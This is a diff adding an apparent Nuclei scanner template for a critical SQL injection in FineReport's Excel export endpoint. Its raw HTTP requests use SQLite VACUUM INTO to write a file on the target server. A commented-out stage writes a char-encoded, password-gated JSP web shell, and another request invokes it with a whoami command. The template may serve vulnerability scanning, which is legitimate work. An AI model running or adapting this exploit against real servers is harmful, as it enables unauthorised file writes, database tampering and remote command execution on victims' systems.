@@ -1,0 +1,81 @@
+id: finereport-export-excel-sqli
+
+info:
+  name: finereport-export-excel-sqli
+  author: finereport
+  severity: critical
+  tags: fine-report,sqli
+
+variables:
+  # 定义第一个请求的参数体
+  postData: "op=getSessionID&viewlets=[5b]{'reportlet':'/'}[5d]&"
+  # 生成32位随机字符串（字母+数字），替换固定的37E9qX8vPzghnWQQLwqkbGDPLHT
+  randomStr: "{{rand_base(5)}}"
+
+http:
+  - raw:
+      - |
+        POST /ReportServer HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 53
+
+        {{postData}}
+
+      # 上传txt证明sqli成功
+
+      - |
+        GET /decision/nx/report/v9/largedataset/export/excel?functionParams=%7b%7d&__parameters__=%7b%7d HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
+        Connection: keep-alive
+        params: %3Ctest%3E%0A%3CLargeDatasetExcelExportJS%20dsName%3D%22XX%22%20colNames%3D%22%7B%7D%22%3E%0A%3CParameters%3E%0A%3CParameter%3E%0A%3CAttributes%20name%3D%22aaa%22/%3E%0A%3CO%20t%3D%22Formula%22%3E%3CAttributes%3Esql%28%27FRDemo%27%2C%22VACUUM%20into%20%28%27FRDemo2.db%27%29%22%2C1%29-sql%28%27FRDemo%27%2C%22pragma%20writable_schema%3Don%22%2C1%29-sql%28%27FRDemo%27%2C%22delete%20from%20sqlite_schema%22%2C1%29-sql%28%27FRDemo%27%2C%22create%20table%20a%28u%20text%29%22%2C1%29-sql%28%27FRDemo%27%2C%22replace%20into%20a%20values%28char%28115%29%7C%7Cchar%28101%29%7C%7Cchar%2899%29%7C%7Cchar%28116%29%7C%7Cchar%28101%29%7C%7Cchar%28115%29%7C%7Cchar%28116%29%7C%7Cchar%2850%29%7C%7Cchar%2848%29%7C%7Cchar%2850%29%7C%7Cchar%2854%29%7C%7Cchar%2848%29%7C%7Cchar%2850%29%7C%7Cchar%2848%29%7C%7Cchar%2853%29%29%22%2C1%29-sql%28%27FRDemo%27%2C%22COMMIT%22%2C1%29-sql%28%27FRDemo%27%2C%22VACUUM%20into%20%28%27%22%2BJOINARRAY%28%5BENV_HOME%2C%27/../{{randomStr}}.txt%27%5D%2C%27%27%29%2B%22%27%29%22%2C1%29%3C/Attributes%3E%3C/O%3E%0A%3C/Parameter%3E%0A%3C/Parameters%3E%3C/LargeDatasetExcelExportJS%3E%3C/test%3E
+        sessionID: {{sessionID}}
+        Accept-Encoding: gzip, deflate, br
+
+      - |
+        GET /{{randomStr}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+        Connection: keep-alive
+        Accept-Encoding: gzip, deflate, br
+      # 上传一句话木马
+
+      # - |
+      #   GET /webroot/decision/nx/report/v9/largedataset/export/excel?functionParams=%7b%7d&__parameters__=%7b%7d HTTP/1.1
+      #   Host: {{Hostname}}
+      #   User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
+      #   Connection: keep-alive
+      #   params: %3Ctest%3E%0A%3CLargeDatasetExcelExportJS%20dsName%3D%22XX%22%20colNames%3D%22%7B%7D%22%3E%0A%3CParameters%3E%0A%3CParameter%3E%0A%3CAttributes%20name%3D%22aaa%22/%3E%0A%3CO%20t%3D%22Formula%22%3E%3CAttributes%3Esql%28%27FRDemo%27%2C%22VACUUM%20into%20%28%27FRDemo2.db%27%29%22%2C1%29-sql%28%27FRDemo%27%2C%22pragma%20writable_schema%3Don%22%2C1%29-sql%28%27FRDemo%27%2C%22delete%20from%20sqlite_schema%22%2C1%29-sql%28%27FRDemo%27%2C%22create%20table%20a%28u%20text%29%22%2C1%29-sql%28%27FRDemo%27%2C%22replace%20into%20a%20values%28char%2860%29%7C%7Cchar%2837%29%7C%7Cchar%2810%29%7C%7Cchar%28105%29%7C%7Cchar%28102%29%7C%7Cchar%2832%29%7C%7Cchar%2840%29%7C%7Cchar%2834%29%7C%7Cchar%28112%29%7C%7Cchar%2897%29%7C%7Cchar%28115%29%7C%7Cchar%28115%29%7C%7Cchar%28119%29%7C%7Cchar%28111%29%7C%7Cchar%28114%29%7C%7Cchar%28100%29%7C%7Cchar%2834%29%7C%7Cchar%2846%29%7C%7Cchar%28101%29%7C%7Cchar%28113%29%7C%7Cchar%28117%29%7C%7Cchar%2897%29%7C%7Cchar%28108%29%7C%7Cchar%28115%29%7C%7Cchar%2840%29%7C%7Cchar%28114%29%7C%7Cchar%28101%29%7C%7Cchar%28113%29%7C%7Cchar%28117%29%7C%7Cchar%28101%29%7C%7Cchar%28115%29%7C%7Cchar%28116%29%7C%7Cchar%2846%29%7C%7Cchar%28103%29%7C%7Cchar%28101%29%7C%7Cchar%28116%29%7C%7Cchar%2880%29%7C%7Cchar%2897%29%7C%7Cchar%28114%29%7C%7Cchar%2897%29%7C%7Cchar%28109%29%7C%7Cchar%28101%29%7C%7Cchar%28116%29%7C%7Cchar%28101%29%7C%7Cchar%28114%29%7C%7Cchar%2840%29%7C%7Cchar%2834%29%7C%7Cchar%28112%29%7C%7Cchar%28119%29%7C%7Cchar%28100%29%7C%7Cchar%2834%29%7C%7Cchar%2841%29%7C%7Cchar%2841%29%7C%7Cchar%2841%29%7C%7Cchar%2832%29%7C%7Cchar%28123%29%7C%7Cchar%2810%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%28106%29%7C%7Cchar%2897%29%7C%7Cchar%28118%29%7C%7Cchar%2897%29%7C%7Cchar%2846%29%7C%7Cchar%28105%29%7C%7Cchar%28111%29%7C%7Cchar%2846%29%7C%7Cchar%2873%29%7C%7Cchar%28110%29%7C%7Cchar%28112%29%7C%7Cchar%28117%29%7C%7Cchar%28116%29%7C%7Cchar%2883%29%7C%7Cchar%28116%29%7C%7Cchar%28114%29%7C%7Cchar%28101%29%7C%7Cchar%2897%29%7C%7Cchar%28109%29%7C%7Cchar%2832%29%7C%7Cchar%28105%29%7C%7Cchar%28110%29%7C%7Cchar%2832%29%7C%7Cchar%2861%29%7C%7Cchar%2832%29%7C%7Cchar%2882%29%7C%7Cchar%28117%29%7C%7Cchar%28110%29%7C%7Cchar%28116%29%7C%7Cchar%28105%29%7C%7Cchar%28109%29%7C%7Cchar%28101%29%7C%7Cchar%2846%29%7C%7Cchar%28103%29%7C%7Cchar%28101%29%7C%7Cchar%28116%29%7C%7Cchar%2882%29%7C%7Cchar%28117%29%7C%7Cchar%28110%29%7C%7Cchar%28116%29%7C%7Cchar%28105%29%7C%7Cchar%28109%29%7C%7Cchar%28101%29%7C%7Cchar%2840%29%7C%7Cchar%2841%29%7C%7Cchar%2846%29%7C%7Cchar%28101%29%7C%7Cchar%28120%29%7C%7Cchar%28101%29%7C%7Cchar%2899%29%7C%7Cchar%2840%29%7C%7Cchar%28114%29%7C%7Cchar%28101%29%7C%7Cchar%28113%29%7C%7Cchar%28117%29%7C%7Cchar%28101%29%7C%7Cchar%28115%29%7C%7Cchar%28116%29%7C%7Cchar%2846%29%7C%7Cchar%28103%29%7C%7Cchar%28101%29%7C%7Cchar%28116%29%7C%7Cchar%2880%29%7C%7Cchar%2897%29%7C%7Cchar%28114%29%7C%7Cchar%2897%29%7C%7Cchar%28109%29%7C%7Cchar%28101%29%7C%7Cchar%28116%29%7C%7Cchar%28101%29%7C%7Cchar%28114%29%7C%7Cchar%2840%29%7C%7Cchar%2834%29%7C%7Cchar%2899%29%7C%7Cchar%28109%29%7C%7Cchar%28100%29%7C%7Cchar%2834%29%7C%7Cchar%2841%29%7C%7Cchar%2841%29%7C%7Cchar%2846%29%7C%7Cchar%28103%29%7C%7Cchar%28101%29%7C%7Cchar%28116%29%7C%7Cchar%2873%29%7C%7Cchar%28110%29%7C%7Cchar%28112%29%7C%7Cchar%28117%29%7C%7Cchar%28116%29%7C%7Cchar%2883%29%7C%7Cchar%28116%29%7C%7Cchar%28114%29%7C%7Cchar%28101%29%7C%7Cchar%2897%29%7C%7Cchar%28109%29%7C%7Cchar%2840%29%7C%7Cchar%2841%29%7C%7Cchar%2859%29%7C%7Cchar%2810%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%28105%29%7C%7Cchar%28110%29%7C%7Cchar%28116%29%7C%7Cchar%2832%29%7C%7Cchar%2897%29%7C%7Cchar%2832%29%7C%7Cchar%2861%29%7C%7Cchar%2832%29%7C%7Cchar%2845%29%7C%7Cchar%2849%29%7C%7Cchar%2859%29%7C%7Cchar%2810%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2898%29%7C%7Cchar%28121%29%7C%7Cchar%28116%29%7C%7Cchar%28101%29%7C%7Cchar%2891%29%7C%7Cchar%2893%29%7C%7Cchar%2832%29%7C%7Cchar%2898%29%7C%7Cchar%2832%29%7C%7Cchar%2861%29%7C%7Cchar%2832%29%7C%7Cchar%28110%29%7C%7Cchar%28101%29%7C%7Cchar%28119%29%7C%7Cchar%2832%29%7C%7Cchar%2898%29%7C%7Cchar%28121%29%7C%7Cchar%28116%29%7C%7Cchar%28101%29%7C%7Cchar%2891%29%7C%7Cchar%2850%29%7C%7Cchar%2848%29%7C%7Cchar%2852%29%7C%7Cchar%2856%29%7C%7Cchar%2893%29%7C%7Cchar%2859%29%7C%7Cchar%2810%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%28111%29%7C%7Cchar%28117%29%7C%7Cchar%28116%29%7C%7Cchar%2846%29%7C%7Cchar%28112%29%7C%7Cchar%28114%29%7C%7Cchar%28105%29%7C%7Cchar%28110%29%7C%7Cchar%28116%29%7C%7Cchar%2840%29%7C%7Cchar%2834%29%7C%7Cchar%2860%29%7C%7Cchar%28112%29%7C%7Cchar%28114%29%7C%7Cchar%28101%29%7C%7Cchar%2862%29%7C%7Cchar%2834%29%7C%7Cchar%2841%29%7C%7Cchar%2859%29%7C%7Cchar%2810%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%28119%29%7C%7Cchar%28104%29%7C%7Cchar%28105%29%7C%7Cchar%28108%29%7C%7Cchar%28101%29%7C%7Cchar%2832%29%7C%7Cchar%2840%29%7C%7Cchar%2840%29%7C%7Cchar%2897%29%7C%7Cchar%2832%29%7C%7Cchar%2861%29%7C%7Cchar%2832%29%7C%7Cchar%28105%29%7C%7Cchar%28110%29%7C%7Cchar%2846%29%7C%7Cchar%28114%29%7C%7Cchar%28101%29%7C%7Cchar%2897%29%7C%7Cchar%28100%29%7C%7Cchar%2840%29%7C%7Cchar%2898%29%7C%7Cchar%2841%29%7C%7Cchar%2841%29%7C%7Cchar%2832%29%7C%7Cchar%2833%29%7C%7Cchar%2861%29%7C%7Cchar%2832%29%7C%7Cchar%2845%29%7C%7Cchar%2849%29%7C%7Cchar%2841%29%7C%7Cchar%2832%29%7C%7Cchar%28123%29%7C%7Cchar%2810%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%28111%29%7C%7Cchar%28117%29%7C%7Cchar%28116%29%7C%7Cchar%2846%29%7C%7Cchar%28112%29%7C%7Cchar%28114%29%7C%7Cchar%28105%29%7C%7Cchar%28110%29%7C%7Cchar%28116%29%7C%7Cchar%2840%29%7C%7Cchar%28110%29%7C%7Cchar%28101%29%7C%7Cchar%28119%29%7C%7Cchar%2832%29%7C%7Cchar%2883%29%7C%7Cchar%28116%29%7C%7Cchar%28114%29%7C%7Cchar%28105%29%7C%7Cchar%28110%29%7C%7Cchar%28103%29%7C%7Cchar%2840%29%7C%7Cchar%2898%29%7C%7Cchar%2841%29%7C%7Cchar%2841%29%7C%7Cchar%2859%29%7C%7Cchar%2810%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%28125%29%7C%7Cchar%2810%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%2832%29%7C%7Cchar%28111%29%7C%7Cchar%28117%29%7C%7Cchar%28116%29%7C%7Cchar%2846%29%7C%7Cchar%28112%29%7C%7Cchar%28114%29%7C%7Cchar%28105%29%7C%7Cchar%28110%29%7C%7Cchar%28116%29%7C%7Cchar%2840%29%7C%7Cchar%2834%29%7C%7Cchar%2860%29%7C%7Cchar%2847%29%7C%7Cchar%28112%29%7C%7Cchar%28114%29%7C%7Cchar%28101%29%7C%7Cchar%2862%29%7C%7Cchar%2834%29%7C%7Cchar%2841%29%7C%7Cchar%2859%29%7C%7Cchar%2810%29%7C%7Cchar%28125%29%7C%7Cchar%2837%29%7C%7Cchar%2862%29%29%22%2C1%29-sql%28%27FRDemo%27%2C%22COMMIT%22%2C1%29-sql%28%27FRDemo%27%2C%22VACUUM%20into%20%28%27%22%2BJOINARRAY%28%5BENV_HOME%2C%27/../{{randomStr}}.jsp%27%5D%2C%27%27%29%2B%22%27%29%22%2C1%29%3C/Attributes%3E%3C/O%3E%0A%3C/Parameter%3E%0A%3C/Parameters%3E%3C/LargeDatasetExcelExportJS%3E%3C/test%3E        
+      #   sessionID: {{sessionID}}
+      #   Accept-Encoding: gzip, deflate, br
+
+      # - |
+      #   GET {{vulnFile}}?pwd=password&cmd=whoami HTTP/1.1
+      #   Host: {{Hostname}}
+      #   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+      #   Connection: keep-alive
+      #   Accept-Encoding: gzip, deflate, br
+
+
+    extractors:
+      - type: regex
+        name: sessionID
+        part: body
+        internal: true  # 标记为内部提取器，仅用于后续请求
+        regex:
+          - "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"  # 匹配 UUID 格式的 SessionID
+
+    # 正确的matchers配置（无报错）
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_3 == 200'  # 匹配第三个请求的响应状态码为200
+          - 'contains(body_3, "SQLite format")'
+        condition: and
